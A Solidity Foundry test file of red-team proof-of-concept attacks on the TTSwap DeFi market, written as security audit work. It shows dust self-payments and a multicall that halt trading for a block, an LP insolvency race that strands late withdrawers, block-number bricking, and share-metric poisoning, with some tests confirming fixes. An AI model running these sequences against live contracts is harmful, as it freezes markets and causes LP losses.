// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import {BaseSetup} from "../BaseSetup.t.sol";
import {MyToken} from "../../src/test/MyToken.sol";
import {S_GoodTmpState, S_ProofKey} from "../../src/interfaces/I_TTSwap_Market.sol";
import {T_GoodKey, T_GoodKeyLibrary} from "../../src/type/T_GoodKey.sol";
import {L_ProofIdLibrary} from "../../src/libraries/L_Proof.sol";
import {L_GoodConfigLibrary} from "../../src/libraries/L_GoodConfig.sol";
import {TTSwapError} from "../../src/libraries/L_Error.sol";
import {s_share} from "../../src/interfaces/I_TTSwap_Token.sol";
import {
    L_TTSwapUINT256Library,
    toTTSwapUINT256
} from "../../src/libraries/L_TTSwapUINT256.sol";

/// @notice Second-wave red-team PoCs: attack surface that survives the payGood `+1`
///         roundup fix and the default safeLine. Focus: liveness weapons, LP
///         accounting errors, tokenomics leaks — no privileged keys required
///         unless stated per test.
contract RT_SecondWave is BaseSetup {
    using T_GoodKeyLibrary for T_GoodKey;
    using L_TTSwapUINT256Library for uint256;
    using L_ProofIdLibrary for S_ProofKey;
    using L_GoodConfigLibrary for uint256;

    uint128 internal constant USDT_INIT_QTY = uint128(50_000 * 10 ** 6);
    uint128 internal constant USDT_INIT_VALUE = uint128(50_000 * 10 ** 12);
    uint128 internal constant BTC_INIT_QTY = uint128(1 * 10 ** 8);
    uint128 internal constant BTC_INIT_VALUE = uint128(63_000 * 10 ** 12);
    uint128 internal constant MIN_INIT_QTY = 500_000;
    uint128 internal constant MAX_INIT_VALUE = uint128(2 ** 109);

    address internal attacker = address(5);
    address internal victim = address(15);
    address internal trader = address(16);

    uint256 internal usdtGoodId;
    uint256 internal btcGoodId;

    function setUp() public override {
        BaseSetup.setUp();
        vm.warp(100);
        usdtGoodId = _init(_usdtKey(), marketcreator, USDT_INIT_VALUE, USDT_INIT_QTY);
        btcGoodId = _init(_btcKey(), users[1], BTC_INIT_VALUE, BTC_INIT_QTY);
    }

    function _usdtKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(usdt), id: 0});
    }

    function _btcKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(btc), id: 0});
    }

    function _ethKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(eth), id: 0});
    }

    function _init(
        T_GoodKey memory key,
        address owner,
        uint128 value,
        uint128 qty
    ) internal returns (uint256 goodId) {
        vm.startPrank(owner);
        deal(key.contractAddress, owner, 100 * uint256(qty), false);
        MyToken(payable(key.contractAddress)).approve(address(market), type(uint256).max);
        market.initGood(key, toTTSwapUINT256(value, qty), defaultdata, owner, defaultdata);
        goodId = key.toId();
        vm.stopPrank();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-09: 1-wei same-token payGood consumes the good's run-block slot.
    // Any later tx touching the good in the SAME block reverts TTSwapError(46).
    // Cost: gas only (1 wei in, 1 wei back). No safeLine / price dependency.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT09_one_wei_payGood_censors_good_for_block() public {
        _relaxSafeLine(usdtGoodId);
        _relaxSafeLine(btcGoodId);
        _warpToFreshRunSlot();

        // Control: victim swap works in a fresh block.
        deal(address(usdt), victim, 1e9, false);
        vm.startPrank(victim);
        usdt.approve(address(market), type(uint256).max);
        market.buyGood(
            _usdtKey(), _btcKey(), toTTSwapUINT256(uint128(1e6), 0),
            address(0), defaultdata, victim, defaultdata, 0
        );
        vm.stopPrank();

        // --- same block, new attempt: attacker fires first with a 1-wei self-pay ---
        _warpToFreshRunSlot();
        deal(address(usdt), attacker, 1, false);
        vm.startPrank(attacker);
        usdt.approve(address(market), 1);
        uint256 balBefore = usdt.balanceOf(attacker);
        market.payGood(
            _usdtKey(), _usdtKey(), toTTSwapUINT256(0, 1),
            attacker, defaultdata, attacker, defaultdata, 0
        );
        vm.stopPrank();
        assertEq(usdt.balanceOf(attacker), balBefore, "attacker lost nothing (1 wei round trip)");

        // Victim's swap touching USDT in the SAME block now reverts (46).
        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 46));
        market.buyGood(
            _usdtKey(), _btcKey(), toTTSwapUINT256(uint128(1e6), 0),
            address(0), defaultdata, victim, defaultdata, 0
        );

        // investGood on USDT is equally blocked.
        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 46));
        market.investGood(_usdtKey(), toTTSwapUINT256(0, 1e6), defaultdata, defaultdata, victim);
    }

    function test_RT09_multicall_whole_market_censorship_one_tx() public {
        _relaxSafeLine(usdtGoodId);
        _relaxSafeLine(btcGoodId);
        _warpToFreshRunSlot();

        // Attacker seals BOTH goods in ONE transaction via multicall.
        deal(address(usdt), attacker, 1, false);
        deal(address(btc), attacker, 1, false);
        vm.startPrank(attacker);
        usdt.approve(address(market), 1);
        btc.approve(address(market), 1);
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeCall(
            market.payGood,
            (_usdtKey(), _usdtKey(), toTTSwapUINT256(0, 1), attacker, defaultdata, attacker, defaultdata, 0)
        );
        calls[1] = abi.encodeCall(
            market.payGood,
            (_btcKey(), _btcKey(), toTTSwapUINT256(0, 1), attacker, defaultdata, attacker, defaultdata, 0)
        );
        market.multicall(calls);
        vm.stopPrank();

        // Any swap on either good this block is dead.
        deal(address(usdt), victim, 1e9, false);
        vm.startPrank(victim);
        usdt.approve(address(market), type(uint256).max);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 46));
        market.buyGood(
            _usdtKey(), _btcKey(), toTTSwapUINT256(uint128(1e6), 0),
            address(0), defaultdata, victim, defaultdata, 0
        );
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 46));
        market.buyGood(
            _btcKey(), _usdtKey(), toTTSwapUINT256(uint128(1e4), 0),
            address(0), defaultdata, victim, defaultdata, 0
        );
        vm.stopPrank();
        emit log("RT09: 2 dust self-pays in 1 tx = whole-market swap halt for the block");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-10: investGood mints 0 shares while accepting the deposit.
    // RT-10 was: welfare inflates investQty so share mint floors to 0 while
    // tokens are still pulled — permanent lock. Mitigated: L_Good.investGood
    // now reverts TTSwapError(56) when investShare == 0 (before state/token
    // accounting commits beyond the outer call's revert).
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT10_investGood_zero_share_deposit_lock() public {
        // Attacker seeds a good at max self-priced V / min Q.
        T_GoodKey memory key = _ethKey();
        uint256 goodId = _init(key, attacker, MAX_INIT_VALUE, MIN_INIT_QTY);
        deal(address(eth), attacker, 1e15, false);
        deal(address(eth), victim, 1e6, false);

        // Attacker inflates investQty 1000x via welfare donation.
        vm.startPrank(attacker);
        eth.approve(address(market), type(uint256).max);
        market.goodWelfare(goodId, 5e11, defaultdata, attacker, defaultdata);
        vm.stopPrank();

        uint256 victimBalBefore = eth.balanceOf(victim);

        // Victim invest would mint 0 shares — must revert 56; deposit not taken.
        vm.startPrank(victim);
        eth.approve(address(market), type(uint256).max);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 56));
        market.investGood(key, toTTSwapUINT256(0, 1e6), defaultdata, defaultdata, victim);
        vm.stopPrank();

        assertEq(eth.balanceOf(victim), victimBalBefore, "victim keeps tokens after 0-share reject");
        uint256 proofId = S_ProofKey(victim, goodId).toId();
        assertEq(market.getProofState(proofId).shares.amount0(), 0, "no victim proof shares");
        emit log_named_uint("RT10 blocked: zero-share invest reverts 56", 56);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-11: FCFS insolvency race. Buys pay out LP principal (physical
    // inventory) while LP claims stay pinned to investQty. After one-sided
    // flow, sum(claims) > physical balance: first LP to exit is made whole,
    // later LPs' disinvest reverts on the token transfer. Multicall makes the
    // per-call disinvestChips cap cosmetic (full exit in one tx).
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT11_one_sided_flow_bricks_late_LPs() public {
        // Fresh skinny ETH good: LP1 seeds 1e6, LP2 (victim) doubles to 2e6.
        uint256 skinnyId = _init(_ethKey(), users[1], BTC_INIT_VALUE, 1e6);
        _relaxSafeLine(usdtGoodId);
        _relaxSafeLine(skinnyId);

        deal(address(eth), victim, 1e6, false);
        vm.startPrank(victim);
        eth.approve(address(market), type(uint256).max);
        market.investGood(_ethKey(), toTTSwapUINT256(0, 1e6), defaultdata, defaultdata, victim);
        vm.stopPrank();

        // Control: without one-sided flow, an LP exit works fine.
        uint256 lp1Proof = S_ProofKey(users[1], skinnyId).toId();
        uint256 lp2Proof = S_ProofKey(victim, skinnyId).toId();
        uint128 lp1Shares0 = market.getProofState(lp1Proof).shares.amount0();
        _warpToFreshRunSlot();
        vm.prank(users[1]);
        market.disinvestProof(lp1Proof, lp1Shares0 / 20, address(0), users[1], defaultdata);
        assertGt(eth.balanceOf(users[1]), 0, "control: LP exits when pool is solvent");

        // One-sided flow: trader sells 7.4e10 USDT and pulls ~30% of the ETH
        // physical inventory out of the pool (safeLineUpper caps the size).
        _warpToFreshRunSlot();
        deal(address(usdt), trader, 7.4e10, false);
        vm.startPrank(trader);
        usdt.approve(address(market), type(uint256).max);
        (uint256 g1change, uint256 g2change) = market.buyGood(
            _usdtKey(), _ethKey(), toTTSwapUINT256(uint128(7.4e10), 0),
            address(0), defaultdata, trader, defaultdata, 0
        );
        vm.stopPrank();
        emit log_named_uint("RT11 value exported from USDT leg", g1change.amount1());
        emit log_named_uint("RT11 ETH bought out", g2change.amount1());

        uint256 physical = eth.balanceOf(address(market));
        S_GoodTmpState memory st = market.getGoodState(skinnyId);
        uint256 claims = st.currentState.amount0();
        emit log_named_uint("RT11 physical ETH left", physical);
        emit log_named_uint("RT11 investQty (LP claims)", claims);
        assertLt(physical, claims, "fractional reserve: claims exceed inventory");

        // Withdrawals pay out of physical inventory FCFS; the chips cap forces
        // a geometric trickle, so exit ORDER decides who eats the shortfall.
        uint256 lp1Recovered = _drainExit(lp1Proof, users[1], skinnyId);
        uint256 lp2Recovered = _drainExit(lp2Proof, victim, skinnyId);
        uint128 lp2SharesLeft = market.getProofState(lp2Proof).shares.amount0();
        emit log_named_uint("RT11 LP1 (early) recovered", lp1Recovered);
        emit log_named_uint("RT11 LP2 (late) recovered", lp2Recovered);
        emit log_named_uint("RT11 LP2 shares still locked", lp2SharesLeft);
        assertGt(lp1Recovered, 8e5, "LP1 (early) made ~whole");
        assertLt(lp2Recovered, 6e5, "LP2 (late) loses >40%");
        assertGt(lp2SharesLeft, 0, "LP2 shares bricked on empty inventory");
        emit log("RT11: late LP cannot exit - FCFS insolvency, no haircut logic");
    }

    /// @dev Exit a proof in legal-sized chunks (chips cap = Q/5 virtual) until
    ///      shares run out or disinvest reverts. Returns tokens recovered.
    function _drainExit(uint256 proofId, address owner, uint256 goodId) internal returns (uint256) {
        uint256 balBefore = eth.balanceOf(owner);
        uint128 sharesLeft = market.getProofState(proofId).shares.amount0();
        for (uint256 i = 0; i < 80 && sharesLeft > 0; i++) {
            uint256 q = market.getGoodState(goodId).currentState.amount1();
            uint128 cap = uint128(((q / 5) * 9) / 10); // 90% of chips cap
            uint128 chunk = sharesLeft < cap ? sharesLeft : cap;
            if (chunk == 0) break;
            vm.prank(owner);
            (bool ok, ) = address(market).call(
                abi.encodeCall(
                    market.disinvestProof,
                    (proofId, chunk, address(0), owner, defaultdata)
                )
            );
            if (!ok) break;
            sharesLeft -= chunk;
        }
        return eth.balanceOf(owner) - balBefore;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-12 is specified behavior: daily drip uses STAKE_MINT_FLOOR (1e12)
    // whenever remaining-to-200M is below the floor, including after cap.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT12_post_cap_floor_drip_is_intentional() public {
        uint256 CAP = 200_000_000_000_000_000_000;
        vm.prank(marketcreator); // DAO admin
        tts_token.mint(marketcreator, CAP);
        assertEq(tts_token.totalSupply(), CAP, "at advertised cap");

        vm.prank(marketcreator);
        tts_token.setCallMintTTS(attacker, true);
        vm.prank(attacker);
        tts_token.stake(attacker, 1e18);

        vm.warp(block.timestamp + 86401);
        vm.prank(attacker);
        tts_token.unstake(attacker, 1e18);

        uint256 minted = tts_token.balanceOf(attacker);
        emit log_named_uint("RT12 post-cap floor drip (raw)", minted);
        assertGt(tts_token.totalSupply(), CAP, "floor drip may exceed 200M");
        assertEq(minted, 1e12, "1e12/day floor at ratio 10000");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-13: fresh goods carry lastRunSlot = 0, so at block.number % 4095 == 0
    // EVERY untouched good fails _checkGoodActive for one full block.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT13_fresh_good_bricked_at_block_mod_4095_zero() public {
        // usdtGoodId was initialized in setUp and never traded since:
        // its lastRunSlot is still the genesis value 0.
        uint256 target = ((block.number / 4095) + 1) * 4095; // == 0 mod 4095
        vm.roll(target);

        deal(address(usdt), victim, 1e8, false);
        vm.startPrank(victim);
        usdt.approve(address(market), type(uint256).max);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 46));
        market.investGood(_usdtKey(), toTTSwapUINT256(0, 1e8), defaultdata, defaultdata, victim);
        vm.stopPrank();
        emit log("RT13: untouched good bricked for the whole block N%4095==0");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-14 mitigated:
    // - addShare rejects metric / chips schedules past MAX_SHARE_MINT_METRIC (60).
    // - merge keeps existing metric (cannot poison upward).
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT14_shareMint_metric_freezes_leftamount() public {
        vm.prank(marketcreator);
        tts_token.setEnv(address(market_proxy));

        vm.startPrank(marketcreator);
        tts_token.mint(marketcreator, 1e8);
        tts_token.approve(address(market), type(uint256).max);
        T_GoodKey memory ttsKey = T_GoodKey({
            ercType: 1,
            contractAddress: address(tts_token),
            id: 0
        });
        market.initGood(ttsKey, toTTSwapUINT256(MAX_INIT_VALUE, MIN_INIT_QTY), defaultdata, marketcreator, defaultdata);
        vm.stopPrank();

        // Control: low metric still mints.
        vm.prank(marketcreator);
        tts_token.addShare(s_share({leftamount: 1e6, metric: 10, chips: 10}), victim);
        vm.prank(victim);
        tts_token.shareMint();
        assertGt(tts_token.balanceOf(victim), 0, "control: low metric mints");

        // Unschedulable under cap 60: metric=60, chips=10 rejected at addShare.
        vm.prank(marketcreator);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 75));
        tts_token.addShare(s_share({leftamount: 1e6, metric: 60, chips: 10}), attacker);

        // Last mintable tranche: metric=60, chips=1.
        vm.prank(marketcreator);
        tts_token.addShare(s_share({leftamount: 1e6, metric: 60, chips: 1}), attacker);
        vm.prank(attacker);
        tts_token.shareMint();
        assertEq(tts_token.balanceOf(attacker), 1e6, "full tranche minted at metric 60");
        (uint128 left, uint120 metricAfter,) = _shareOf(attacker);
        assertEq(left, 0, "no frozen leftover");
        assertEq(metricAfter, 61, "metric advanced past last mintable");
        emit log("RT14a blocked: unschedulable high-metric share rejected; chips=1 at 60 clears fully");
    }

    function test_RT14_addShare_merge_metric_poisoning() public {
        vm.startPrank(marketcreator);
        tts_token.addShare(s_share({leftamount: 1e6, metric: 1, chips: 10}), victim);
        // Over-cap dust rejected; in-cap higher metric still cannot raise victim's metric.
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 75));
        tts_token.addShare(s_share({leftamount: 1, metric: 120, chips: 1}), victim);

        tts_token.addShare(s_share({leftamount: 1, metric: 50, chips: 1}), victim);
        vm.stopPrank();

        (, uint120 metric, uint8 chips) = _shareOf(victim);
        assertEq(metric, 1, "merge keeps existing metric (no upward poison)");
        assertEq(chips, 10, "chips kept max");
        (uint128 left,,) = _shareOf(victim);
        assertEq(left, 1e6 + 1, "dust amount still merged");
        emit log("RT14b blocked: merge cannot raise metric; over-cap metric reverts 75");
    }

    function _shareOf(
        address who
    ) internal view returns (uint128 leftamount, uint120 metric, uint8 chips) {
        s_share memory s = tts_token.usershares(who);
        return (s.leftamount, s.metric, s.chips);
    }
}
